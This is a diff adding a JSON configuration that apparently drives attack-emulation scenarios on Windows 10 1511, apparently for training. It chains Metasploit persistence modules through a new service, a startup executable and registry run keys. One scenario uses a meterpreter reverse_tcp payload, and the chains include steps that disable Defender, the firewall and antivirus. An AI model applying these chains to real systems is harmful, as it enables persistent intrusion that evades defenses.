@@ -1,0 +1,221 @@
+    {
+        "windows_10_1511": {
+            "TA03_T1050_P1": {
+                "scenario_tactic": {
+                    "name": "Persistence",
+                    "id": "TA0003"
+                },
+                "scenario_technique": {
+                    "name": "New Service",
+                    "id": "T1050"
+                },
+                "procedure": {
+                    "classification": {
+                        "scenario_type": "active_scenario",
+                        "name": "persistence_service",
+                        "classification_id": "TA03_T1050_P1",
+                        "job-role": "System/Network Admin",
+                        "difficulty": "4"
+                    },
+                    "environment": {
+                        "platform": "Windows 10 pro",
+                        "version": "1511",
+                        "service-protocol": null,
+                        "cve": "",
+                        "configuration": {
+                            "settings": {
+                                "1": "disable defender"
+                            }
+                        }
+                    },
+                    "execution": {
+                        "prerequisite": [
+                            {
+                            "scenario_tactic": "Privilege_Escalation",
+                            "proc_id": "TA04_T1088_P1",
+                            "type": "active_scenario"
+                        }
+                    ],
+                        "spawn_seperate_session": true,
+                        "tool": "metasploit",
+                        "exploit": "windows/local/persistence_service",
+                        "options": {
+                            "REMOTE_EXE_NAME": "REMOTE_EXE_NAME_$ref",
+                            "SERVICE_NAME": "SERVICE_NAME_$ref",
+                            "REMOTE_EXE_PATH": "REMOTE_EXE_PATH_$ref",
+                            "LHOST": "LHOST_$ref",
+                            "LPORT": "LPORT_$ref",
+                            "SESSION": "SESSION_$ref"
+                        },
+                        "access": {
+                            "access-type": "",
+                            "access-level": "",
+                            "path-execution-file": ""
+                        }
+                    }
+                },
+                "dynamic_procedures": [
+                    {
+                        "sub_procedure": {
+                            "proc_id": "TA05_T1089_P1",
+                            "proc_name": "disable_firewall",
+                            "scenario_tactic": "Defense_Evasion"
+                        }
+                    },
+                    {
+                        "sub_procedure": {
+                            "proc_id": "TA05_T1089_P2",
+                            "proc_name": "killav",
+                            "scenario_tactic": "Defense_Evasion"
+                        }
+                    }
+                ]
+            },
+            "TA03_T1060_P1": {
+                "scenario_tactic": {
+                    "name": "Persistence",
+                    "id": "TA0003"
+                },
+                "scenario_technique": {
+                    "name": "Registry Run Keys / Startup Folder",
+                    "id": "T1060"
+                },
+                "procedure": {
+                    "classification": {
+                        "scenario_type": "active_scenario",
+                        "name": "persistence_exe",
+                        "classification_id": "TA03_T1060_P1",
+                        "job-role": "System/Network Admin",
+                        "difficulty": "4"
+                    },
+                    "environment": {
+                        "platform": "Windows 10 pro",
+                        "version": "1511",
+                        "service-protocol": null,
+                        "cve": "",
+                        "configuration": {
+                            "settings": {
+                                "1": "disable defender"
+                            }
+                        }
+                    },
+                    "execution": {
+                        "prerequisite": [
+                            {
+                            "scenario_tactic": "Privilege_Escalation",
+                            "proc_id": "TA04_T1088_P1",
+                            "type": "active_scenario"
+                        },
+                        {
+                            "scenario_tactic": "Build_Capabilities",
+                            "proc_id": "TA24_T1345_P1",
+                            "type": "helper_scenario"
+                        }
+                    ],
+                        "spawn_seperate_session": false,
+                        "tool": "metasploit",
+                        "post": "windows/manage/persistence_exe",
+                        "options": {
+                            "REXENAME": "REXENAME_$ref",
+                            "REXEPATH": "REXEPATH_$ref",
+                            "STARTUP": "SYSTEM",
+                            "SESSION": "SESSION_$ref"
+                        },
+                        "access": {
+                            "access-type": "",
+                            "access-level": "",
+                            "path-execution-file": ""
+                        }
+                    }
+                },
+                "dynamic_procedures": [
+                    {
+                        "sub_procedure": {
+                            "proc_id": "TA05_T1089_P1",
+                            "proc_name": "disable_firewall",
+                            "scenario_tactic": "Defense_Evasion"
+                        }
+                    },
+                    {
+                        "sub_procedure": {
+                            "proc_id": "TA05_T1089_P2",
+                            "proc_name": "killav",
+                            "scenario_tactic": "Defense_Evasion"
+                        }
+                    }
+                ]
+            },
+            "TA03_T1060_P2": {
+                "scenario_tactic": {
+                    "name": "Persistence",
+                    "id": "TA0003"
+                },
+                "scenario_technique": {
+                    "name": "Registry Run Keys / Startup Folder",
+                    "id": "T1060"
+                },
+                "procedure": {
+                    "classification": {
+                        "scenario_type": "active_scenario",
+                        "name": "registry_persistence",
+                        "classification_id": "TA03_T1060_P2",
+                        "job-role": "System/Network Admin",
+                        "difficulty": "4"
+                    },
+                    "environment": {
+                        "platform": "Windows 10 pro",
+                        "version": "1511",
+                        "service-protocol": null,
+                        "cve": "",
+                        "configuration": {
+                            "settings": {
+                                "1": "disable defender"
+                            }
+                        }
+                    },
+                    "execution": {
+                        "prerequisite": [
+                            {
+                            "scenario_tactic": "Privilege_Escalation",
+                            "proc_id": "TA04_T1088_P1",
+                            "type": "active_scenario"
+                        }
+                    ],
+                        "spawn_seperate_session": false,
+                        "tool": "metasploit",
+                        "exploit": "windows/local/registry_persistence",
+                        "payload": "payload windows/x64/meterpreter/reverse_tcp",
+                        "options": {
+                            "BLOB_REG_NAME": "BLOB_REG_NAME_$ref",
+                            "RUN_NAME": "RUN_NAME_$ref",
+                            "STARTUP": "SYSTEM",
+                            "LHOST": "LHOST_$ref",
+                            "LPORT": "LPORT_$ref",
+                            "SESSION": "SESSION_$ref"
+                        },
+                        "access": {
+                            "access-type": "",
+                            "access-level": "",
+                            "path-execution-file": ""
+                        }
+                    }
+                },
+                "dynamic_procedures": [
+                    {
+                        "sub_procedure": {
+                            "proc_id": "TA05_T1089_P1",
+                            "proc_name": "disable_firewall",
+                            "scenario_tactic": "Defense_Evasion"
+                        }
+                    },
+                    {
+                        "sub_procedure": {
+                            "proc_id": "TA05_T1089_P2",
+                            "proc_name": "killav",
+                            "scenario_tactic": "Defense_Evasion"
+                        }
+                    }
+                ]
+            }
+        }
+    }
